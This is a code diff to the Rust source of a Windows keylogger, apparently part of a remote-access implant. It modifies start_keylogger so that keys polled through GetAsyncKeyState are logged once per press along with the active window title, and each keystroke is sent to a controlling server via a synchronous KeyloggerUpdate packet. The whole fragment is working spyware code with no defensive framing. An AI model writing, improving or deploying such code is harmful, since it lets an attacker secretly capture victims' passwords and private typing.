@@ -24,6 +24,7 @@ pub fn start_keylogger(realtime: bool) {
     thread::spawn(move || {
         let mut last_window = String::new();
         let mut key_buffer = String::new();
+        let mut key_states = [false; 256];
 
         while KEYLOGGER_RUNNING.load(Ordering::SeqCst) {
             let active_window = get_active_window_title();
@@ -35,8 +36,12 @@ pub fn start_keylogger(realtime: bool) {
             }
 
             for key in 8..255 {
-                // Check if key is pressed
-                if unsafe { GetAsyncKeyState(key as i32) } as u16 & 0x8000 != 0 {
+                let is_down = unsafe { GetAsyncKeyState(key as i32) } as u16 & 0x8000 != 0;
+                
+                if is_down && !key_states[key as usize] {
+                    // Key just pressed
+                    key_states[key as usize] = true;
+                    
                     let key_str = translate_key(key as u32);
                     if !key_str.is_empty() {
                         key_buffer.push_str(&key_str);
@@ -46,11 +51,12 @@ pub fn start_keylogger(realtime: bool) {
                                 window_title: active_window.clone(),
                                 key_data: key_str.clone(),
                             };
-                            tokio::spawn(async move {
-                                let _ = send_packet(ServerboundPacket::KeyloggerUpdate(update)).await;
-                            });
+                            let _ = crate::handler::send_packet_sync(ServerboundPacket::KeyloggerUpdate(update));
                         }
                     }
+                } else if !is_down && key_states[key as usize] {
+                    // Key released
+                    key_states[key as usize] = false;
                 }
             }
 
